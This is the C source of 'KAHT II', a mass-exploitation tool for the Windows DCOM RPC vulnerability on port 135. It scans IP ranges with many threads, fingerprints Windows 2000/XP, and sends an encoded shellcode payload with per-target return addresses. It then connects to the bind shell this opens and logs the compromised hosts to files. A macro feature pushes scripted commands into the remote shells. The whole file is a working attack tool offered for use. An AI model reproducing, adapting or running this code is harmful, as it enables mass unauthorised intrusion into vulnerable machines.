#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
 #include <unistd.h>
 #include <windows.h>
 #include <process.h>
 #include <winsock2.h>
 #include <tcconio.h>
 #pragma comment (lib,"ws2_32.lib")
#else
#include <pthread.h>
#include <sys/types.h>
 #include <sys/ipc.h>
 #include <sys/sem.h>
#include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <fcntl.h>
 #include <unistd.h>
#endif

#define MAX_THREADS 			512
#define NTHREADS			50
#define PORT 				135
#define CONNECT 			6		//Connect Timeout
#define RECV 				5		//recv Timeout
#define ATTACKTIMEOUT 			5		//
#define RPC_FINGERPRINT_TIMEOUT         6		//rpc fingerprint
#define INITRPORT                     (rand()/2)+32767
//#define INITRPORT         		53		//PORT TO SPAWN A SHELL


int RPORT,salir=0,threads=0,rpcopen=0;
//int AUTOHACKING=0;
int ip1[4],ip2[4];
FILE *results;	//results.txt ips con el puerto 135 abierto :D
#ifndef WIN32
#define CRITICAL_SECTION pthread_t
#endif
CRITICAL_SECTION cs,css,cslog,csshell; //Givemeip CS, number of threads, ipstologfile,shell()



//Ultra Fast port Scanner
char *givemeip(char *ip);
void checkea(void *threadn);
//Macro Functions..
void show_macros(int sock2);
void execute_macro(char opt,int sock2);
void macro(char opt, int sock2);
//Exploit Code...
void attack(char *linea,int peta);
int shell (int sock2);
void readconsole(void *sock2);
//me
void banner(void);
// remote  Install
int InstallRemoteServiceNbt (char *ip);
int InstallRemoteServiceFtp (char *ip);


unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char winshellcode[]=
  "\x05\x00\x00\x03\x10\x00\x00\x00\xa8\x06\x00\x00\xe5\x00\x00\x00"
  "\x90\x06\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
  "\x00\x00\x00\x00\x32\x24\x58\xfd\xcc\x45\x64\x49\xb0\x70\xdd\xae"
  "\x74\x2c\x96\xd2\x60\x5e\x0d\x00\x01\x00\x00\x00\x00\x00\x00\x00"
  "\x70\x5e\x0d\x00\x02\x00\x00\x00\x7c\x5e\x0d\x00\x00\x00\x00\x00"
  "\x10\x00\x00\x00\x80\x96\xf1\xf1\x2a\x4d\xce\x11\xa6\x6a\x00\x20"
  "\xaf\x6e\x72\xf4\x0c\x00\x00\x00\x4d\x41\x52\x42\x01\x00\x00\x00"
  "\x00\x00\x00\x00\x0d\xf0\xad\xba\x00\x00\x00\x00\xa8\xf4\x0b\x00"
  "\x20\x06\x00\x00\x20\x06\x00\x00\x4d\x45\x4f\x57\x04\x00\x00\x00"
  "\xa2\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
  "\x38\x03\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
  "\x00\x00\x00\x00\xf0\x05\x00\x00\xe8\x05\x00\x00\x00\x00\x00\x00"
  "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\xc8\x00\x00\x00\x4d\x45\x4f\x57"
  "\xe8\x05\x00\x00\xd8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
  "\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\xc4\x28\xcd\x00\x64\x29\xcd\x00\x00\x00\x00\x00"
  "\x07\x00\x00\x00\xb9\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xab\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xa5\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xa6\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xa4\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xad\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\xaa\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
  "\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
  "\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x38\x03\x00\x00"
  "\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc"
  "\x50\x00\x00\x00\x4f\xb6\x88\x20\xff\xff\xff\xff\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc"
  "\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
  "\xc0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0c\x00"
  "\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xd8\x98\x93"
  "\x98\x4f\xd2\x11\xa9\x3d\xbe\x57\xb2\x00\x00\x00\x32\x00\x31\x00"
  "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x80\x00\x00\x00\x0d\xf0\xad\xba"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
  "\x4d\x45\x4f\x57\x04\x00\x00\x00\xc0\x01\x00\x00\x00\x00\x00\x00"
  "\xc0\x00\x00\x00\x00\x00\x00\x46\x3b\x03\x00\x00\x00\x00\x00\x00"
  "\xc0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
  "\x01\x00\x01\x00\x81\xc5\x17\x03\x80\x0e\xe9\x4a\x99\x99\xf1\x8a"
  "\x50\x6f\x7a\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
  "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x30\x00\x00\x00\x78\x00\x6e\x00"
  "\x00\x00\x00\x00\xd8\xda\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x20\x2f\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
  "\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
  "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x10\x00\x00\x00\x30\x00\x2e\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x68\x00\x00\x00\x0e\x00\xff\xff"
  "\x68\x8b\x0b\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x86\x01\x00\x00\x00\x00\x00\x00\x86\x01\x00\x00\x5c\x00\x5c\x00"
  "\x46\x00\x58\x00\x4e\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
  "\x4e\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00"
  "\x46\x00\x58\x00\x9f\x75\x18\x00\xcc\xe0\xfd\x7f\xcc\xe0\xfd\x7f"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
  "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
  "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
  "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
  "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
  "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
  "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
  "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\xdd\x5a\x60\xdf\xda\x8a\x81"
  "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
  "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
  "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
  "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
  "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
  "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
  "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
  "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
  "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\x40\xa1\x1f\x4c\xd5\x24\xc5\xd3"
  "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
  "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
  "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
  "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
  "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
  "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
  "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
  "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
  "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
  "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
  "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
  "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
  "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
  "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
  "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04\x00\x5c\x00\x43\x00"
  "\x24\x00\x5c\x00\x31\x00\x32\x00\x33\x00\x34\x00\x35\x00\x36\x00"
  "\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
  "\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x2e\x00"
  "\x64\x00\x6f\x00\x63\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc"
  "\x20\x00\x00\x00\x30\x00\x2d\x00\x00\x00\x00\x00\x88\x2a\x0c\x00"
  "\x02\x00\x00\x00\x01\x00\x00\x00\x28\x8c\x0c\x00\x01\x00\x00\x00"
  "\x07\x00\x00\x00\x00\x00\x00\x00";

struct
{
  char *os;
  u_long ret;
} targets[] =
   {
	  { "[Win2k]", 0x0018759F },
  	  { "[WinXP]", 0x0100139d },
	};



//GLOBALS...

/******************************************************************/

void banner(void)
{
			printf ("_________________________________________________        \n");
		printf("           KAHT II - MASSIVE RPC EXPLOIT\n");
		printf("  DCOM RPC exploit. Modified by aT4r@3wdesign.es\n");
		printf("  #haxorcitos && #localhost  @Efnet Ownz you!!!\n");
		printf ("________________________________________________\n\n");

}
void usage(void)
{
        printf(" Usage:   KaHt2.exe IP1 IP2 [THREADS] [AH]\n");
		printf(" example: KaHt2.exe 192.168.0.0 192.168.255.255\n");
		printf("\n  NEW!: Macros Available in shell enviroment!!\n  Type !! for more info into a shell.\n");
		//printf("  If AUTOHACKING ENABLED MACRO !9 WILL BE EXECUTED\n");
        exit(1);
    }


/******************************************************************/
/*****************************************************************/
void execute_macro(char opt,int sock2){

	FILE *macro;
	char cadena[512];
	char tmp[512];
	int found=0;
	int delay=500;	//configurable TIMEOUT FOR CMDS - Default=500
	if ((macro=fopen("macros.txt","r")) !=NULL)
	{
		while (!feof(macro))
		{
				memset(cadena,'\0',sizeof(cadena));
				fgets(cadena,sizeof(cadena)-1,macro);
				cadena[strlen(cadena)-1]='\0';
				if ((found==1) && ((   strncmp(cadena,"[Macro]",strlen("[Macro]"))) ==0) )
			            {
				        fclose(macro);
					printf(" + Ejecucion de La Macro Terminada\n");
					fclose(macro);return;}
				        if ((   strncmp(cadena,"delay=",strlen("delay="))) ==0)
					    delay=atoi(cadena+6);

				        if  ((   strncmp(cadena,"key=",strlen("key="))) ==0)
				   	   if (( cadena+strlen("key=!"))[0]==opt)
						   found=1; //OUR CMDS ARE HERE! :)

				        if  ( ((   strncmp(cadena,"cmd=",strlen("cmd="))) ==0) && (found) )
				           if (strlen(cadena)>strlen("cmd= "))
						{
							strcpy(tmp,cadena+4);
							strcat(tmp,"\r\n");
				 			send(sock2,tmp,strlen(tmp),0);
							//printf("Enviado: %s! de tamaño: %i\n",tmp,sizeof(tmp));
							sleep(delay);
						}
		}
		fclose(macro);
		send(sock2,"\n",strlen("\n"),0);
		printf(" - Macro Done -\n");
	}

	sleep(25);




}

/*****************************************************************/
void show_macros(int sock2){
	FILE *macro;
	char cadena[512];

	printf(" +______________(Available Macros)______________\n");
	if ((macro=fopen("macros.txt","r")) !=NULL)
	{
		while (!feof(macro))
		{
				memset(cadena,'\0',512);
				fgets(cadena,sizeof(cadena)-1,macro);
				if (strlen(cadena)>1)
				{
				cadena[strlen(cadena)-1]='\0';
				if  ((   strncmp(cadena,"name=",strlen("name="))) ==0)
					printf(" + Nombre: %s ",cadena+strlen("name="));
				if  ((strncmp(cadena,"key=",strlen("key="))) ==0)
					printf("Trigger: %s\n",cadena+strlen("key="));
			}
		}
		fclose(macro);
	}
	send(sock2,"\n",strlen("\n"),0);
	sleep(10);

}
/*****************************************************************/



void macro(char opt, int sock2)
{
	switch(opt)
	{
	case '!':
		show_macros(sock2);
		break;
	default:
		execute_macro(opt,sock2);
		break;
	}
}



/*****************************************************************/
void readconsole(void *sock2)
{
	int     l;
    char    buf[512];

/*if (AUTOHACKING) {
	execute_macro('9',(int) sock2);
	salir=1;
	}
*/
	while(!salir)
	{
    	l = read (0, buf, sizeof (buf));
		if (l <= 0)
			salir=1;
		else
		{
  			if ( (l==3) && (buf[0]=='!') )
	  			macro(buf[1],(int)sock2);
  			else
	   		{
				send((int)sock2,buf,l,0);
				if (strncmp(buf,"exit",strlen("exit")) ==0)
				{
					salir=1;
					_endthread();
				}
			}
		}
	}

}

void enviamacro(void *sock2)
{
sleep(500);

macro(9,(int)sock2);
salir=1;
_endthread();


}

/****************************************************************/
int shell (int sock2) /* NOT RIPPED FROM TESO :P */
{
	int     l;
    char    buf[512];
	salir=0;
	_beginthread(readconsole,4096,(void *)(int) sock2);
    while (!salir)
	{
		if ((l=recv (sock2, buf, sizeof (buf),0))>0)
		write (1, buf, l);
		else sleep(100);

	}
	printf("\n - Connection Closed\n");
	return (salir);
}
/*****************************************************************/

int main(int argc, char **argv)
{
	 int i,total=NTHREADS;

    #ifdef WIN32
	WSADATA ws;

	clrscr();
    #endif
	banner();

	if(argc<3)
		usage();
    #ifdef WIN32
    if (WSAStartup(MAKEWORD(2,0),&ws)!=0)
    {
        printf("  WSAStartup Error: %d\n",WSAGetLastError());
        exit(1);
    }
    #endif
	sscanf (argv[1], "%d.%d.%d.%d", &ip1[0],&ip1[1],&ip1[2],&ip1[3]);
	sscanf (argv[2], "%d.%d.%d.%d", &ip2[0],&ip2[1],&ip2[2],&ip2[3]);

	for(i=0;i<4;i++)
	{
		if ( (ip1[i]>255) || (ip1[i]<0) ) usage();
		if ( (ip2[i]>255) || (ip2[i]<0) ) usage();

	}
	if (argc==4) 	total=atoi(argv[3]);
//	if (argc==5) 	AUTOHACKING=atoi(argv[4]);

#ifdef WIN32
	InitializeCriticalSection(&cs);
	InitializeCriticalSection(&css);
	InitializeCriticalSection(&cslog);
	InitializeCriticalSection(&csshell);
#else
	//Aqui meter los thread de linux :D y semaforos
#endif
	//ULTRA FAST PORT SCANNER....
	if ((results=fopen("results.txt","w"))==NULL) exit(0);
	printf(" [+] Targets: %s-%s with %i Threads\n",argv[1],argv[2],total);
	srand ( time(NULL) );  RPORT=INITRPORT;
	printf(" [+] Attacking Port: %i. Remote Shell at port: %i\n",PORT,RPORT);
	printf(" [+] Scan In Progress...\n");
	for(i=0;i<total;i++)
              #ifdef WIN32
		_beginthread(checkea,8192,(void *)i);
	      #else
	        //Aqui meter los thread de linux :D y semaforos
              #endif
	while(threads>0)
	   sleep(100);
   fclose(results);
   printf("\n [+] Scan Finished. Found %i open ports\n",rpcopen);

return(0);
}


/****************************************************************************************/

//void attack(char *linea,int peta)
void attack(char *linea,int peta)
{
if (peta==-1)	return;


// if (AUTOHACKING!=1)
       #ifdef WIN32
	struct timeval tv;
       #else
	struct time_t tv;
       #endif
	struct sockaddr_in target_ip;
	int sock,sock2; //Exploit Socket && Shell Socket
	unsigned short port =  135;

	unsigned short lportl=666; /* drg */
        char lport[4] = "\x00\xFF\xFF\x8b"; /* drg */
   	unsigned char buf1[0x1000];
	u_long tmp=1; //TIMEOUTS
	FILE *w2k;
	FILE *wxp;
	int i;
	fd_set fds;

	EnterCriticalSection(&csshell);

	target_ip.sin_family = AF_INET;
   	target_ip.sin_addr.s_addr = inet_addr(linea);
        target_ip.sin_port = htons(port);

    if ((sock=socket(AF_INET,SOCK_STREAM,0)) != -1)
    {
		printf(" - Connecting to %s\n",linea);

		tmp=1;
		ioctlsocket( sock, FIONBIO, &tmp);
		tv.tv_sec = CONNECT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sock, &fds);

	    connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip));
		//if((i=select(sock+1,0,&fds,0,&tv))!=SOCKET_ERROR)
		// if (i!=0)
		if((i=select(sock+1,0,&fds,0,&tv))>0)
	   	 {
		   printf("   Sending Exploit to a %s Server...",targets[peta].os);
		   tmp=0;
		   ioctlsocket( sock, FIONBIO, &tmp);
    		if (send(sock,bindstr,sizeof(bindstr),0)>0)
    		{
				tmp=1;
		   		ioctlsocket( sock, FIONBIO, &tmp);
				tv.tv_sec = RECV;
				tv.tv_usec = 0;
				FD_ZERO(&fds);
				FD_SET(sock, &fds);
				if(select(sock +1, &fds, NULL, NULL, &tv) > 0)
				{
		   			recv(sock, buf1, 1000, 0);

					lportl=htons(RPORT);
					memcpy(&lport[1], &lportl, 2);
					*(long*)lport = *(long*)lport ^ 0x9432BF80;
					memcpy(&winshellcode[1351],&lport,4);
					memcpy(winshellcode+916, (unsigned char *) &targets[peta].ret, 4);
					tmp=0;
			   		ioctlsocket( sock, FIONBIO, &tmp);

					send(sock,winshellcode,1705,0);
    				sleep(50);
					if ((sock2=socket(AF_INET,SOCK_STREAM,0)) !=-1)
					{
						target_ip.sin_family = AF_INET;
	   					target_ip.sin_addr.s_addr = inet_addr(linea);
	   					target_ip.sin_port = htons(RPORT);
						tmp=1;
						ioctlsocket( sock2, FIONBIO, &tmp);
						tv.tv_sec = CONNECT;
						tv.tv_usec = 0;
						FD_ZERO(&fds);
						FD_SET(sock2, &fds);
	    				connect(sock2,(struct sockaddr *)&target_ip, sizeof(target_ip));
						if((i=select(sock+1,0,&fds,0,&tv))>0)
						{
						  printf("\n - Conectando con la Shell Remota...\n\n");
						  salir=0;
						  shell(sock2);
                                               #ifdef WIN32
						  closesocket(sock2);
                                               #else
						  close(sock2);
                                               #endif
						  strcat(linea,"\n");
			  			  if (peta==0)
							 {
								 w2k=fopen("win2k.txt","a");
								 if (w2k!=NULL)
								 	{ fputs(linea,w2k); fclose(w2k);}
								else printf(" !!UNABLE TO LOG IP %s",linea);

								}
						   else
							{

								wxp=fopen("winxp.txt","a");
								if (wxp!=NULL)
									{fputs(linea,wxp); fclose(wxp);}
								else printf(" !!UNABLE TO LOG IP %s",linea);
							}
						//} else 	printf("UNABLE TO CONNECT TO SHELL\n");
						} else 	printf("FAILED\n");
					}
					else printf("\n UNABLE TO CREATE SOCK2\n");
				}
				else printf(" FAILED to send Exploit2\n");
			}
			else printf(" FAILED to send Exploit\n");
		}

}
//if (AUTOHACKING!=1)
	LeaveCriticalSection(&csshell);

}

/*********************************************************************************/
char *givemeip(char *ip)
{

	EnterCriticalSection(&cs);


	if (ip1[3]!=254)
			ip1[3]++;
	else
	{
		return(NULL); //uhh kiddiss!

	}
	if (ip1[2]==255)
	{	ip1[2]++; ip1[1]++;}

	LeaveCriticalSection(&cs);

	if (ip1[2]>ip2[2])   return(NULL);
	if (ip1[2]==ip2[2])
		if (ip1[3]>ip2[3]) return(NULL);

	sprintf(ip,"%d.%d.%d.%d",ip1[0],ip1[1],ip1[2],ip1[3]);

	return(ip);
}

/******************************************************************************/

//int version(char *ip, int sock)

int version(char ip[16], int sock)
{
//un poco de ettercap...


unsigned char peer0_0[] = {
0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00,
0xcc, 0x00, 0x00, 0x00, 0x84, 0x67, 0xbe, 0x18,
0x31, 0x14, 0x5c, 0x16, 0x00, 0x00, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
0xb8, 0x4a, 0x9f, 0x4d, 0x1c, 0x7d, 0xcf, 0x11,
0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,
0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,
0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,
0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,
0x02, 0x00, 0x01, 0x00, 0xa0, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00,
0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00,
0x0a, 0x42, 0x24, 0x0a, 0x00, 0x17, 0x21, 0x41,
0x2e, 0x48, 0x01, 0x1d, 0x13, 0x0b, 0x04, 0x4d,
0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,
0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,
0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,
0x04, 0x00, 0x01, 0x00, 0xb0, 0x01, 0x52, 0x97,
0xca, 0x59, 0xcf, 0x11, 0xa8, 0xd5, 0x00, 0xa0,
0xc9, 0x0d, 0x80, 0x51, 0x00, 0x00, 0x00, 0x00,
0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
0x02, 0x00, 0x00, 0x00 };


unsigned char peer0_1[] = {
0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00,
0xaa, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x05, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x28, 0x63, 0x29, 0x20,
0x75, 0x65, 0x72, 0x84, 0x20, 0x73, 0x73, 0x53,
0x20, 0x82, 0x80, 0x67, 0x00, 0x00, 0x00, 0x00,
0x80, 0x1d, 0x94, 0x5e, 0x96, 0xbf, 0xcd, 0x11,
0xb5, 0x79, 0x08, 0x00, 0x2b, 0x30, 0xbf, 0xeb,
0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x5c, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x00, 0x00,
0x41, 0x00, 0x41, 0x00, 0x5c, 0x00, 0x43, 0x00,
0x24, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x2e, 0x00,
0x74, 0x00, 0x78, 0x00, 0x74, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,
0x58, 0x73, 0x0b, 0x00, 0x01, 0x00, 0x00, 0x00,
0x31, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x07, 0x00 };

/*

unsigned char win2kvuln[] = {
 0x04,  0x00,  0x00,  0x00,
 0x00,  0x00,  0x00,  0x00,
 0x04,  0x5d,  0x88,  0x8a,
 0xeb,  0x1c,  0xc9,  0x11,
 0x9f,  0xe8,  0x08,  0x00,
 0x2b,  0x10,  0x48,  0x60,
 0x02,  0x00,  0x00,  0x00,
 0x00,  0x00,  0x00,  0x00,
 0x04,  0x5d,  0x88,  0x8a,
 0xeb,  0x1c,  0xc9,  0x11,
 0x9f,  0xe8,  0x08,  0x00,
 0x2b,  0x10,  0x48,  0x60,
 0x02,  0x00,  0x00,  0x00};
*/
	fd_set fds2;
	unsigned char buf[1024];

	int l;
	struct timeval tv2;
	FD_ZERO(&fds2);
	FD_SET(sock, &fds2);
	tv2.tv_sec = RPC_FINGERPRINT_TIMEOUT;
	tv2.tv_usec = 0;

	memset(buf,'\0',sizeof(buf));
	send(sock,peer0_0,sizeof(peer0_0),0);
	if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0)
	{
		l=recv (sock, buf, sizeof (buf),0);
//		for(i=0;i<52;i++)
//		{
//			if (i==28)	i=i+4;
//			if (buf[i+32]!=win2kvuln[i])
//			{
				send(sock,peer0_1,sizeof(peer0_1),0);
				if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0)
				{
					memset(buf,'\0',sizeof(buf));
					l=recv (sock, buf, sizeof (buf),0);
					if (l==32)
					{
						closesocket(sock);
						return(1);//winxp
					}
					else
					{
				      #ifdef WIN32
					 closesocket(sock);
				      #else
					 close(sock);
				      #endif
					 return(0);//win2kby default. Nt4 not added..
					}
				}
				else return(-1);
//			}


		//}
//		closesocket(sock);
//		return(0);//win2k
	}
	closesocket(sock);
	return(-1);		//Unknown
}
/********************************************************************************/

